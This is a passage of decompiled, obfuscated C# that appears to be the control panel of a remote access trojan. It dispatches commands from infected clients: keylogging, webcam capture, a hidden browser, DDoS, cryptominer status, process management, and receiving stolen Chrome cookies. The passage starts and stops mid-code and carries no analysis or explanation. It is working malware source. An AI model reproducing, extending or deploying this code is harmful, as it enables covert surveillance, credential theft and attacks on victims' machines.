							chat.T1.SelectionFont = new Font(chat.T1.Font, FontStyle.Bold);
							chat.T1.AppendText(Class6.smethod_5() + " [Client] ");
							chat.T1.SelectionFont = chat.T1.Font;
							chat.T1.AppendText(Class6.smethod_9(array[3]) + "\r\n");
							chat.T1.SelectionStart = chat.T1.TextLength;
							chat.T1.ScrollToCaret();
							try
							{
								Interaction.AppActivate(chat.Text);
								return;
							}
							catch (Exception ex15)
							{
								ProjectData.SetProjectError(ex15);
								Exception projectError25 = ex15;
								ProjectData.SetProjectError(projectError25);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								return;
							}
						}
					}
					if (chat == null)
					{
						Chat chat2 = new Chat();
						chat2.Name = "ch" + client.ip();
						chat2.sk = client;
						chat2.osk = client.osk;
						chat2.T2.Enabled = false;
						chat2.Show();
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				return;
			case "VB":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex29)
					{
						ProjectData.SetProjectError(ex29);
						Exception ex30 = ex29;
						ProjectData.SetProjectError(ex30);
						Exception projectError45 = ex30;
						ProjectData.SetProjectError(projectError45);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					VB vB = (VB)smethod_7("VB" + client.ip());
					string left6 = array[2];
					if (Operators.CompareString(left6, "~", TextCompare: false) == 0)
					{
						if (vB == null)
						{
							VB vB2 = new VB();
							vB2.C = client;
							vB2.Name = "VB" + client.ip();
							vB2.Show();
						}
					}
					else if (Operators.CompareString(left6, "Start", TextCompare: false) == 0)
					{
						try
						{
							string expression11 = array[3];
							string[] array37 = Strings.Split(expression11, "|'|");
							vB.n.Text = array37[0];
							vB.w.Text = array37[1];
							return;
						}
						catch (Exception projectError46)
						{
							ProjectData.SetProjectError(projectError46);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "dos":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex64)
					{
						ProjectData.SetProjectError(ex64);
						Exception ex65 = ex64;
						ProjectData.SetProjectError(ex65);
						Exception projectError90 = ex65;
						ProjectData.SetProjectError(projectError90);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					Ddos ddos = (Ddos)smethod_7("dos" + client.ip());
					string left16 = array[2];
					if (Operators.CompareString(left16, "~", TextCompare: false) == 0)
					{
						if (ddos == null)
						{
							Ddos ddos2 = new Ddos();
							ddos2.C = client;
							ddos2.Name = "dos" + client.ip();
							ddos2.Show();
						}
					}
					else if (Operators.CompareString(left16, "Start", TextCompare: false) == 0)
					{
						try
						{
							string expression26 = array[3];
							string[] array70 = Strings.Split(expression26, "|'|");
							ddos.n.Text = array70[0];
							ddos.w.Text = array70[1];
							return;
						}
						catch (Exception projectError91)
						{
							ProjectData.SetProjectError(projectError91);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "inff":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex45)
					{
						ProjectData.SetProjectError(ex45);
						Exception ex46 = ex45;
						ProjectData.SetProjectError(ex46);
						Exception projectError68 = ex46;
						ProjectData.SetProjectError(projectError68);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					info info = (info)smethod_7("inff" + client.ip());
					switch (array[2])
					{
					case "~":
						if (info == null)
						{
							info info2 = new info();
							info2.C = client;
							info2.Name = "inff" + client.ip();
							info2.Show();
						}
						break;
					case "tx":
						try
						{
							string expression19 = array[3];
							string[] array50 = Strings.Split(expression19, "|'|");
							info.F1.Text = array50[0];
							info.F2.Text = array50[1];
							info.F3.Text = array50[2];
							info.F4.Text = array50[3];
							info.F5.Text = array50[4];
							info.F6.Text = array50[5];
							info.F7.Text = array50[6];
							info.F8.Text = array50[7];
							info.F9.Text = array50[8];
							info.F10.Text = array50[9];
							info.F11.Text = array50[10];
							break;
						}
						catch (Exception projectError70)
						{
							ProjectData.SetProjectError(projectError70);
							ProjectData.ClearProjectError();
							break;
						}
					case "Start":
						try
						{
							string expression18 = array[3];
							string[] array49 = Strings.Split(expression18, "|'|");
							info.n.Text = array49[0];
							info.w.Text = array49[1];
							info.Admin = array49[2];
							break;
						}
						catch (Exception projectError69)
						{
							ProjectData.SetProjectError(projectError69);
							ProjectData.ClearProjectError();
							break;
						}
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "Def":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex20)
					{
						ProjectData.SetProjectError(ex20);
						Exception ex21 = ex20;
						ProjectData.SetProjectError(ex21);
						Exception projectError34 = ex21;
						ProjectData.SetProjectError(projectError34);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					Def def = (Def)smethod_7("Def" + client.ip());
					string left4 = array[2];
					if (Operators.CompareString(left4, "~", TextCompare: false) == 0)
					{
						if (def == null)
						{
							Def def2 = new Def();
							def2.C = client;
							def2.Name = "Def" + client.ip();
							def2.Show();
						}
					}
					else if (Operators.CompareString(left4, "Start", TextCompare: false) == 0)
					{
						try
						{
							string expression8 = array[3];
							string[] array19 = Strings.Split(expression8, "|'|");
							def.n.Text = array19[0];
							def.w.Text = array19[1];
							def.Admin = array19[2];
							return;
						}
						catch (Exception projectError35)
						{
							ProjectData.SetProjectError(projectError35);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "NGR":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.SetProjectError(ex2);
						Exception projectError2 = ex2;
						ProjectData.SetProjectError(projectError2);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				NGR nGR = (NGR)smethod_7("NGR" + client.ip());
				switch (array[2])
				{
				case "~":
					if (nGR == null)
					{
						NGR nGR2 = new NGR();
						nGR2.C = client;
						nGR2.Name = "NGR" + client.ip();
						nGR2.Show();
					}
					break;
				case "Start":
					try
					{
						string expression = array[3];
						string[] array2 = Strings.Split(expression, "|'|");
						nGR.n.Text = array2[0];
						nGR.w.Text = array2[1];
						break;
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						break;
					}
				case "iff":
					try
					{
						if (Operators.CompareString(array[3], "YES", TextCompare: false) == 0)
						{
							nGR.Button1.Text = "installed";
							nGR.Button1.Enabled = true;
						}
						else
						{
							nGR.Button1.Text = "Failed, try again";
							nGR.Button1.Enabled = true;
						}
						break;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
						break;
					}
				case "ng":
					try
					{
						if (Operators.CompareString(array[3], "YES", TextCompare: false) == 0)
						{
							nGR.Button1.Text = "installed";
							nGR.Button1.Enabled = true;
						}
						break;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
						break;
					}
				case "NN":
					try
					{
						if (Operators.CompareString(array[3], "NO", TextCompare: false) == 0)
						{
							nGR.Button1.Text = "install";
							nGR.Button1.Enabled = true;
						}
						break;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
						break;
					}
				}
				return;
			}
			case "tory":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex47)
					{
						ProjectData.SetProjectError(ex47);
						Exception ex48 = ex47;
						ProjectData.SetProjectError(ex48);
						Exception projectError71 = ex48;
						ProjectData.SetProjectError(projectError71);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				tory tory = (tory)smethod_7("tory" + client.ip());
				switch (array[2])
				{
				case "Past":
					tory.T1.Text = Conversions.ToString(smethod_0(array[3]));
					tory.ERR.Hide();
					break;
				case "Start":
					try
					{
						string expression20 = array[3];
						string[] array51 = Strings.Split(expression20, "|'|");
						tory.n.Text = array51[0];
						tory.w.Text = array51[1];
						break;
					}
					catch (Exception projectError72)
					{
						ProjectData.SetProjectError(projectError72);
						ProjectData.ClearProjectError();
						break;
					}
				case "~":
					if (tory == null)
					{
						tory tory2 = new tory();
						tory2.C = client;
						tory2.Name = "tory" + client.ip();
						tory2.Show();
					}
					break;
				}
				return;
			}
			case "Act":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex27)
					{
						ProjectData.SetProjectError(ex27);
						Exception ex28 = ex27;
						ProjectData.SetProjectError(ex28);
						Exception projectError42 = ex28;
						ProjectData.SetProjectError(projectError42);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					Act act = (Act)smethod_7("Act" + client.ip());
					switch (array[2])
					{
					case "Start":
						try
						{
							string expression10 = array[3];
							string[] array33 = Strings.Split(expression10, "|'|");
							act.n.Text = array33[0];
							act.w.Text = array33[1];
							break;
						}
						catch (Exception projectError43)
						{
							ProjectData.SetProjectError(projectError43);
							ProjectData.ClearProjectError();
							break;
						}
					case "Past":
						if (act == null)
						{
							break;
						}
						try
						{
							act.L1.Items.Clear();
							string[] array34 = Strings.Split(array[3], "\r\n");
							string[] array35 = array34;
							foreach (string text18 in array35)
							{
								if (Operators.CompareString(text18, "", TextCompare: false) != 0)
								{
									string[] array36 = Strings.Split(text18, "%|%");
									ListViewItem listViewItem11 = new ListViewItem();
									listViewItem11.Text = array36[0];
									listViewItem11.SubItems.Add(array36[1]);
									listViewItem11.ImageIndex = 0;
									act.L1.Items.Add(listViewItem11);
								}
							}
							break;
						}
						catch (Exception projectError44)
						{
							ProjectData.SetProjectError(projectError44);
							ProjectData.ClearProjectError();
							break;
						}
					case "~":
						if (act == null)
						{
							Act act2 = new Act();
							act2.C = client;
							act2.Name = "Act" + client.ip();
							act2.Show();
						}
						break;
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "TCP":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex9)
					{
						ProjectData.SetProjectError(ex9);
						Exception ex10 = ex9;
						ProjectData.SetProjectError(ex10);
						Exception projectError15 = ex10;
						ProjectData.SetProjectError(projectError15);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					TCP tCP = (TCP)smethod_7("TCP" + client.ip());
					switch (array[2])
					{
					case "Past":
						if (tCP == null)
						{
							break;
						}
						try
						{
							tCP.L1.Items.Clear();
							string[] array7 = Strings.Split(array[3], "\r\n");
							string[] array8 = array7;
							foreach (string text4 in array8)
							{
								if (Operators.CompareString(text4, "", TextCompare: false) != 0)
								{
									string[] array9 = Strings.Split(text4, "|");
									ListViewItem listViewItem5 = new ListViewItem();
									listViewItem5.Text = "TCP";
									listViewItem5.SubItems.Add(array9[0]);
									listViewItem5.SubItems.Add(array9[1]);
									listViewItem5.SubItems.Add(array9[2]);
									listViewItem5.ImageIndex = 0;
									tCP.L1.Items.Add(listViewItem5);
								}
							}
							break;
						}
						catch (Exception projectError16)
						{
							ProjectData.SetProjectError(projectError16);
							ProjectData.ClearProjectError();
							break;
						}
					case "Start":
						try
						{
							string expression5 = array[3];
							string[] array10 = Strings.Split(expression5, "|'|");
							tCP.n.Text = array10[0];
							tCP.w.Text = array10[1];
							break;
						}
						catch (Exception projectError17)
						{
							ProjectData.SetProjectError(projectError17);
							ProjectData.ClearProjectError();
							break;
						}
					case "~":
						if (Class2.XTBfo6WOm.act_0 == null)
						{
							TCP tCP2 = new TCP();
							tCP2.C = client;
							tCP2.Name = "TCP" + client.ip();
							tCP2.Show();
						}
						break;
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "MSG":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex49)
					{
						ProjectData.SetProjectError(ex49);
						Exception ex50 = ex49;
						ProjectData.SetProjectError(ex50);
						Exception projectError73 = ex50;
						ProjectData.SetProjectError(projectError73);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					MSG mSG = (MSG)smethod_7("MSG" + client.ip());
					string left9 = array[2];
					if (Operators.CompareString(left9, "~", TextCompare: false) != 0)
					{
						if (Operators.CompareString(left9, "Start", TextCompare: false) == 0)
						{
							try
							{
								string expression21 = array[3];
								string[] array52 = Strings.Split(expression21, "|'|");
								mSG.n.Text = array52[0];
								mSG.w.Text = array52[1];
								return;
							}
							catch (Exception projectError74)
							{
								ProjectData.SetProjectError(projectError74);
								ProjectData.ClearProjectError();
								return;
							}
						}
					}
					else if (mSG == null)
					{
						MSG mSG2 = new MSG();
						mSG2.C = client;
						mSG2.Name = "MSG" + client.ip();
						mSG2.Show();
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "cli":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex35)
					{
						ProjectData.SetProjectError(ex35);
						Exception ex36 = ex35;
						ProjectData.SetProjectError(ex36);
						Exception projectError55 = ex36;
						ProjectData.SetProjectError(projectError55);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				Cli cli = (Cli)smethod_7("cli" + client.ip());
				switch (array[2])
				{
				case "Past":
					cli.TextBox1.Text = array[3];
					break;
				case "Start":
					try
					{
						string expression14 = array[3];
						string[] array41 = Strings.Split(expression14, "|'|");
						cli.n.Text = array41[0];
						cli.w.Text = array41[1];
						break;
					}
					catch (Exception projectError56)
					{
						ProjectData.SetProjectError(projectError56);
						ProjectData.ClearProjectError();
						break;
					}
				case "~":
					if (cli == null)
					{
						Cli cli2 = new Cli();
						cli2.C = client;
						cli2.Name = "cli" + client.ip();
						cli2.Show();
					}
					break;
				}
				return;
			}
			case "Fun":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex7)
					{
						ProjectData.SetProjectError(ex7);
						Exception ex8 = ex7;
						ProjectData.SetProjectError(ex8);
						Exception projectError13 = ex8;
						ProjectData.SetProjectError(projectError13);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				Fun fun = (Fun)smethod_7("Fun" + client.ip());
				string left2 = array[2];
				if (Operators.CompareString(left2, "~", TextCompare: false) != 0)
				{
					if (Operators.CompareString(left2, "Start", TextCompare: false) == 0)
					{
						try
						{
							string expression4 = array[3];
							string[] array6 = Strings.Split(expression4, "|'|");
							fun.n.Text = array6[0];
							fun.w.Text = array6[1];
							return;
						}
						catch (Exception projectError14)
						{
							ProjectData.SetProjectError(projectError14);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else if (fun == null)
				{
					Fun fun2 = new Fun();
					fun2.C = client;
					fun2.Name = "Fun" + client.ip();
					fun2.Show();
				}
				return;
			}
			case "loc":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex51)
					{
						ProjectData.SetProjectError(ex51);
						Exception ex52 = ex51;
						ProjectData.SetProjectError(ex52);
						Exception projectError75 = ex52;
						ProjectData.SetProjectError(projectError75);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				loc loc = (loc)smethod_7("loc" + client.ip());
				string left10 = array[2];
				if (Operators.CompareString(left10, "~", TextCompare: false) == 0)
				{
					if (loc == null)
					{
						loc loc2 = new loc();
						loc2.C = client;
						loc2.Name = "loc" + client.ip();
						loc2.Show();
					}
				}
				else if (Operators.CompareString(left10, "Start", TextCompare: false) == 0)
				{
					try
					{
						string expression22 = array[3];
						string[] array53 = Strings.Split(expression22, "|'|");
						loc.n.Text = array53[0];
						loc.w.Text = array53[1];
						return;
					}
					catch (Exception projectError76)
					{
						ProjectData.SetProjectError(projectError76);
						ProjectData.ClearProjectError();
						return;
					}
				}
				return;
			}
			case "HBR":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex39)
					{
						ProjectData.SetProjectError(ex39);
						Exception ex40 = ex39;
						ProjectData.SetProjectError(ex40);
						Exception projectError61 = ex40;
						ProjectData.SetProjectError(projectError61);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					HBR hBR = (HBR)smethod_7("HBR" + client.ip());
					switch (array[2])
					{
					case "bro":
						try
						{
							if (Operators.CompareString(array[3], "1", TextCompare: false) == 0)
							{
								hBR.P1.Enabled = true;
								hBR.Cstart.Text = "Browser Start";
							}
							if (Operators.CompareString(array[3], "2", TextCompare: false) == 0)
							{
								hBR.P2.Enabled = true;
								hBR.Fstart.Text = "Browser Start";
							}
							if (Operators.CompareString(array[3], "3", TextCompare: false) == 0)
							{
								hBR.P3.Enabled = true;
								hBR.Mstart.Text = "Browser Start";
							}
							if (Operators.CompareString(array[3], "4", TextCompare: false) == 0)
							{
								hBR.P4.Enabled = true;
								hBR.Istart.Text = "Browser Start";
							}
							break;
						}
						catch (Exception projectError62)
						{
							ProjectData.SetProjectError(projectError62);
							ProjectData.ClearProjectError();
							break;
						}
					case "Start":
					{
						byte[] array46 = (byte[])smethod_1(Convert.FromBase64String(array[3]));
						MemoryStream memoryStream2 = new MemoryStream(array46, 0, array46.Length);
						memoryStream2.Write(array46, 0, array46.Length);
						hBR.BrowserBox.Image = Image.FromStream(memoryStream2, useEmbeddedColorManagement: true);
						memoryStream2.Dispose();
						if (int_14 == 0)
						{
							hBR.CCC.Hide();
							int_14 = 2;
						}
						hBR.Label7.Text = smethod_4(array[3].Length);
						break;
					}
					case "~":
						if (hBR == null)
						{
							HBR hBR2 = new HBR();
							hBR2.sk = client;
							hBR2.Name = "HBR" + client.ip();
							hBR2.Show();
						}
						break;
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "kl":
				if (!((Control)object_1).InvokeRequired)
				{
					if (smethod_7("kl" + client.ip()) == null)
					{
						kl kl2 = new kl();
						kl2.c = client;
						kl2.Name = "kl" + client.ip();
						kl.SS = Conversions.ToString(RuntimeHelpers.GetObjectValue(gsciXiVbtJ(client.L)));
						kl2.Show();
					}
					Thread thread = new Thread(smethod_9);
					object[] obj2 = new object[2] { client, null };
					string text19 = "kla" + string_1 + array[1] + string_1 + array[2] + string_1 + array[3];
					obj2[1] = Class6.smethod_3(ref text19);
					thread.Start(obj2);
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				return;
			case "ret":
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				return;
			case "Miner":
				Application.DoEvents();
				if (!((Control)object_1).InvokeRequired)
				{
					if ((notf)smethod_7("YyUNsnAS" + client.ip()) != null)
					{
						return;
					}
					try
					{
						Application.DoEvents();
						string text5 = null;
						string text6 = null;
						string text7 = null;
						string text8 = null;
						string text9 = null;
						string text10 = null;
						text5 = Class6.smethod_9(array[1]);
						text6 = Class6.smethod_9(array[2]);
						text7 = Class6.smethod_9(array[3]);
						text8 = Class6.smethod_9(array[4]);
						text9 = Class6.smethod_9(array[5]);
						text10 = Class6.smethod_9(array[6]);
						ListViewItem listViewItem6 = new ListViewItem();
						listViewItem6.Text = text5;
						listViewItem6.SubItems.Add(text6);
						if (Operators.CompareString(text7, "1", TextCompare: false) != 0)
						{
							listViewItem6.SubItems.Add("Disabled");
						}
						else
						{
							listViewItem6.SubItems.Add("Enabled");
						}
						if (Operators.CompareString(text8, "1", TextCompare: false) != 0)
						{
							listViewItem6.SubItems.Add("Disabled");
						}
						else
						{
							listViewItem6.SubItems.Add("Enabled");
						}
						if (Operators.CompareString(text9, "1", TextCompare: false) == 0)
						{
							listViewItem6.SubItems.Add("Enabled");
						}
						else
						{
							listViewItem6.SubItems.Add("Disabled");
						}
						if (Operators.CompareString(text10, "1", TextCompare: false) == 0)
						{
							listViewItem6.SubItems.Add("running");
						}
						else
						{
							listViewItem6.SubItems.Add("Not running");
						}
						listViewItem6.ImageIndex = 12;
						Class2.XTBfo6WOm.Form1.L1_Miner.Items.Add(listViewItem6);
						if (Class2.XTBfo6WOm.Form1.TabControl1.SelectedIndex != 5)
						{
							Class2.XTBfo6WOm.Form1.NOTF_L1_Miner.Show();
						}
						return;
					}
					catch (Exception projectError26)
					{
						ProjectData.SetProjectError(projectError26);
						ProjectData.ClearProjectError();
						return;
					}
				}
				((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				return;
			case "Cok":
				Application.DoEvents();
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				else
				{
					if ((notf)smethod_7("YyxUNsAS" + client.ip()) != null)
					{
						return;
					}
					try
					{
						Application.DoEvents();
						if (Operators.CompareString(array[3], null, TextCompare: false) != 0)
						{
							string text2 = null;
							string text3 = null;
							list_4.Add(Class6.smethod_9(array[3]));
							text2 = Class6.smethod_9(array[1]);
							text3 = Class6.smethod_9(array[2]);
							Class6.smethod_9(array[3]).Split('\r');
							ListViewItem listViewItem = new ListViewItem();
							listViewItem.Text = text2;
							listViewItem.SubItems.Add(text3);
							listViewItem.SubItems.Add("Chrome");
							listViewItem.SubItems.Add("successfully");
							listViewItem.ImageIndex = 11;
							Class2.XTBfo6WOm.Form1.Logisx.Items.Add(listViewItem);
							if (Class2.XTBfo6WOm.Form1.TabControl1.SelectedIndex != 7)
							{
								Class2.XTBfo6WOm.Form1.NOTF_COK.Show();
							}
						}
						return;
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
						return;
					}
				}
				return;
			case "CAM":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex62)
					{
						ProjectData.SetProjectError(ex62);
						Exception projectError88 = ex62;
						ProjectData.SetProjectError(projectError88);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				Cam cam = (Cam)smethod_7("cam" + client.ip());
				switch (array[2])
				{
				case "@":
					if (cam != null)
					{
						cam.Button1.Text = "Start";
					}
					break;
				case "!":
				{
					if (cam == null)
					{
						break;
					}
					Cam cam3 = cam;
					cam3.fps++;
					cam.pkt = byte_.Length;
					Thread.Sleep(10);
					if (array[3].Length == 1)
					{
						break;
					}
					Image image = Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_17(byte_, array[2] + string_1), new object[1] { 1 }, null)));
					if (cam.CheckBox3.Checked)
					{
						try
						{
							image.Save(cam.folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg");
						}
						catch (Exception ex63)
						{
							ProjectData.SetProjectError(ex63);
							Exception projectError89 = ex63;
							ProjectData.SetProjectError(projectError89);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
					cam.PictureBox1.Image = image;
					break;
				}
				case "~":
					if (cam != null)
					{
						int num33 = array.Length - 1;
						for (int num34 = 3; num34 <= num33; num34++)
						{
							cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(array[num34]);
						}
					}
					else if (!((Control)object_1).InvokeRequired)
					{
						Cam cam2 = new Cam();
						cam2.sk = client;
						cam2.osk = client.osk;
						cam2.Name = "cam" + client.ip();
						int num35 = array.Length - 1;
						for (int num36 = 3; num36 <= num35; num36++)
						{
							cam2.ComboBox1.SelectedIndex = cam2.ComboBox1.Items.Add(array[num36]);
						}
						cam2.Show();
					}
					else
					{
						((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
					}
					break;
				}
				return;
			}
			case "proc":
			{
				Manager manager10 = (Manager)smethod_7("m" + client.ip());
				if (manager10 == null)
				{
					return;
				}
				lock (Class2.XTBfo6WOm.Manager.Prog)
				{
					string text30 = array[1];
					switch (text30)
					{
					case "!":
						lock (manager10)
						{
							string[] array64 = Strings.Split(array[2], "[::]");
							bool gparam_ = default(bool);
							if (!smethod_10(ref gparam_, manager10.LPR.Items.Count == 0))
							{
								try
								{
									IEnumerator enumerator10 = default(IEnumerator);
									foreach (ListViewItem item2 in manager10.LPR.Items)
									{
										if (!(item2.ForeColor == Color.GreenYellow))
										{
											continue;
										}
										try
										{
											foreach (ListViewItem.ListViewSubItem subItem in item2.SubItems)
											{
												subItem.ForeColor = manager10.LPR.ForeColor;
											}
										}
										finally
										{
											if (enumerator10 is IDisposable)
											{
												(enumerator10 as IDisposable).Dispose();
											}
										}
									}
								}
								finally
								{
									IEnumerator enumerator11 = default(IEnumerator);
									if (enumerator11 is IDisposable)
									{
										(enumerator11 as IDisposable).Dispose();
									}
								}
							}
							if (array64.Length > 1)
							{
								manager10.Prog.Value = 0;
								manager10.Prog.Maximum = array64.Length;
								List<ListViewItem> list8 = new List<ListViewItem>();
								string[] array65 = array64;
								foreach (string text31 in array65)
								{
									string[] array66 = Strings.Split(text31, "[:]");
									if (Operators.CompareString(text31, string.Empty, TextCompare: false) == 0)
									{
										break;
									}
									if (array66[2].StartsWith("\\??\\"))
									{
										array66[2] = array66[2].Remove(0, "\\??\\".Length);
									}
									try
									{
										manager10.Prog.Value++;
									}
